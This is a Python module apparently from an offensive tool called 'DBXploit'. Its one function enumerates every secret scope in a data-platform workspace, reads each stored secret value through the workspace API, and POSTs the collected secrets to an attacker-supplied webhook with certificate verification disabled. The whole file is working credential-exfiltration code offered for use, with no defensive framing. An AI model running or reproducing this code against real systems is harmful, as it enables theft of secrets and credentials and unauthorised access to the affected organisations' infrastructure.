import requests
import json
from core.utils import get, safe_json
from config import workspace_url, log, headers

def exfiltrate_secrets(webhook_url):
    log("[*] Starting secret exfiltration...")
    scopes_url = f"{workspace_url}/api/2.0/secrets/scopes/list"
    scopes_resp = get(scopes_url)
    scopes = safe_json(scopes_resp).get("scopes", [])

    result = {
        "source": "DBXploit",
        "workspace": workspace_url,
        "secrets": []
    }

    for scope in scopes:
        scope_name = scope.get("name")
        log(f"[+] Enumerating scope: {scope_name}")
        keys_url = f"{workspace_url}/api/2.0/secrets/list"
        keys_resp = get(keys_url, params={"scope": scope_name})
        keys = safe_json(keys_resp).get("secrets", [])

        for key_entry in keys:
            key = key_entry['key']
            get_url = f"{workspace_url}/api/2.0/secrets/get"
            secret_resp = get(get_url, params={"scope": scope_name, "key": key})
            value = safe_json(secret_resp).get("value")
            if value:
                result["secrets"].append({
                    "scope": scope_name,
                    "key": key,
                    "value": value
                })

    try:
        log("[*] Sending data to webhook...")
        response = requests.post(webhook_url, json=result, verify=False)
        if response.status_code == 200:
            log("[+] Secrets successfully exfiltrated.")
        else:
            log(f"[!] Webhook error {response.status_code}: {response.text}", level="error", always_print=True)
    except Exception as e:
        log(f"[!] Failed to exfiltrate secrets: {e}", level="error", always_print=True)
